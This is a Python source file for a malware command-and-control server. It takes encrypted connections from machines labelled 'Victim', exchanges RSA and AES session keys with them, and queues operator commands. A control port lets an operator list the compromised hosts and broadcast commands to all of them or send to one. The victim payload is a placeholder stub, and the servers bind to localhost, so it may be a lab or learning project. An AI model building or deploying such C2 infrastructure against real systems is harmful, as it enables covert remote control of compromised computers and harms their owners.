from C2 import *
import socket
from _thread import *
from threading import Thread
import functools
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Cipher import AES
import base64
import json
import queue 
import codecs
codecs.register_error("strict", codecs.ignore_errors)

print = functools.partial(print, flush=True)

# thread_lock = threading.Lock()
threadList = []

class Victim(Thread):
    def __init__(self,clSock):
        Thread.__init__(self)
        self.q = queue.Queue()
        self.conn = clSock
        self.OTPPacketLen = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in this connection before the EncryptedOTP could be recieved");
            sys.exit(-1)
        self.EncryptedOTP = self.conn.recv(self.OTPPacketLen)
        self.rsaKey = RSA.import_key(PRVKEY)
        self.cipher = PKCS1_v1_5.new(self.rsaKey)
        self.OTP = self.cipher.decrypt(self.EncryptedOTP,"failed")
        self.aesKey = base64.b64decode(AESKEY, altchars=None, validate=False)
        self.OTPencodedAESKey = self.applyOTP(self.OTP,self.aesKey)
        self.conn.send(self.OTPencodedAESKey);
        # initiate the session key
        self.SessionKeyPacketLen = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in Syncronization");
            sys.exit(-1)
        self.EncryptedKey = self.conn.recv(self.SessionKeyPacketLen)
        self.SessionKey = self.cipher.decrypt(self.EncryptedKey,"failed")
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in Syncronization");
            sys.exit(-1)
        self.SessionIV = self.conn.recv(16);
        if(self.conn.send(b"\x01") != 1):
            print("An error has occured in Syncronization");
            sys.exit(-1)
        self.conn.settimeout(5)
    
    def applyOTP(self,OTP, KEY):
        return bytes(o ^ k for o, k in zip(OTP, KEY))


    def secure_send(self, buf: bytes, length: len):
        try:
            # Synchronize Buffer
            self.conn.recv(1)
            sessionCipher = AES.new(self.SessionKey, AES.MODE_CFB, self.SessionIV)
            self.conn.sendall((length).to_bytes(4,byteorder="big")) # UINT32 4 bytes.
            # Synchronize buffer
            self.conn.recv(1)
            ciphertext = sessionCipher.encrypt(buf);
            # send the cipher text back to the client
            # the session IV has allready been updated in this instance.
            self.conn.sendall(ciphertext)
            self.SessionIV = self.conn.recv(16)
        except Exception as msg:
            print("C2 Server> Victim" + self.get_name() + "Disconnected! ")
            threadList.remove(self)
            sys.exit()

    def secure_recv(self,):
        try:
            sessionCipher = AES.new(self.SessionKey, AES.MODE_CFB, self.SessionIV)
            msgSZ = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
            self.conn.sendall(b"\x01")
            MSG = self.conn.recv(msgSZ)
            self.conn.sendall(b"\x01")
            plaintext = sessionCipher.decrypt(MSG[16:])
            self.SessionIV = MSG[:16]
            print(str(self.name))
            return plaintext;
        except Exception as msg:
            print("C2 Server> Victim " + self.get_name() + " Disconnected! ")
            threadList.remove(self)
            sys.exit()

    def get_name(self):
        return str(self.conn.getpeername()) 
        
    def addCommandToQueue(self,command):
        self.q.put(command)

    def getCommandFromQueue(self):
        return self.q.get() 
    def run(self):
        print("Payload Placeholder Stub")

class C2(Thread):
    
    def __init__(self,Payload):
        Thread.__init__(self)
        print("C2 Server > Initilizing C2 server")
        self.svr = socket.socket()
        self.svr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.svr.bind(('127.0.0.1',PORT_SVR))
        print("C2 Server > Bind Socket: ", PORT_SVR)
        self.svr.listen(24)
        print("C2 Server > Listening for Victim Connections")
        self.vPayload = Payload
        threadList = []
 
    def run(self):
        while True:
            cl, addr = self.svr.accept()
            print("C2 Server > Accepted connection from victim: ", addr)
            v=self.vPayload(cl)
            v.setName("Victim: " + str(addr))
            v.start()
            threadList.append(v)
            
        #cl.recv(1024)
                
        svr.close()
class CTRLClient(Thread):

    def __init__(self, cliSoc):
        Thread.__init__(self)
        self.conn = cliSoc
        self.name = self.conn.getpeername()
        print("C2 Server > Control Client " + self.name + " Connected")

    def sendStr(self, SendStr):
            length = len(SendStr)
            self.conn.send((length).to_bytes(8,byteorder="big")) # UINT32 4 bytes.
            self.conn.recv(1) #Sync
            self.conn.send(SendStr.encode()) 
            self.conn.recv(1) #Sync
    def recvStr(self):
            msgSZ = int.from_bytes(self.conn.recv(8),byteorder='big',signed=False)
            self.conn.send(b"\x01")
            MSG = self.conn.recv(msgSZ)
            self.conn.send(b"\x01") 
            return MSG.decode()
    def run(self):
        jsonArray = []
        try:
            while True:
                try:
                    command = json.loads(self.recvStr())
                    if command["Target"] == str(self.conn.getsockname()):
                        if str(command["Command"]) == "List Connections":
                            jsonArray=[]
                            for t in threadList:
                                jsonArray.append(t.get_name())
                            response = {}
                            response["Type"] = "Victim List"
                            response["Message"] = jsonArray
                            self.sendStr(json.dumps(response))
                        else:
                            continue
                    elif command["Target"] == "*":
                        for t in threadList:
                            t.addCommandToQueue(str(command["Command"]))
                        response = {}
                        response["Type"] = "Data"
                        response["Message"] = "Command sent to all victims"
                        self.sendStr(json.dumps(response))
                    else:
                        for t in threadList:
                            if str(command["Target"]) == t.get_name():
                                t.addCommandToQueue(str(command["Command"]))
                                response["Type"] = "Data"
                                response["Message"] = "Command sent to victim: " + str(t.get_name()) 
                                self.sendStr(json.dumps(response))
                except:
                    if self.conn.fileno() == -1:
                        print("Socket disconnected")
                        break
                    response = {}
                    response["Type"] = "Error"
                    response["Message"] = "JSON Parsing Error"
                    self.sendStr(json.dumps(response))
                    print("C2 > Json parsing error")
        except:
            print("C2 Server > Control Client " + self.name +" Disconnected")
class CTRLThread(Thread):

    def __init__(self):
        Thread.__init__(self)        
        print("C2 Server > Initilizing C2 Controle Server")
        self.svr = socket.socket()
        self.svr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.svr.bind(('127.0.0.1', CTRL_PORT))
        print("C2 Server > CTRLSver socket Binded to port:", CTRL_PORT)
        self.svr.listen(1)
        print("C2 Server > CTRLSver Socket Listening" )
        

    def run(self):
        while True:
            cl, addr = self.svr.accept()
            c = CTRLClient(cl) 
            c.setName("CTRLClient")
            c.start()
            
def run(payload):
    VictimHandler = C2(payload)
    VictimHandler.setName("VictimHandelerThread")
    VictimHandler.start()
    CTRLHandler = CTRLThread()
    CTRLHandler.setName("AttackControleThread")
    CTRLHandler.start() 

if __name__ == "__main__":
    run(Victim)
{"Target": "*", "Command": "test queue"}
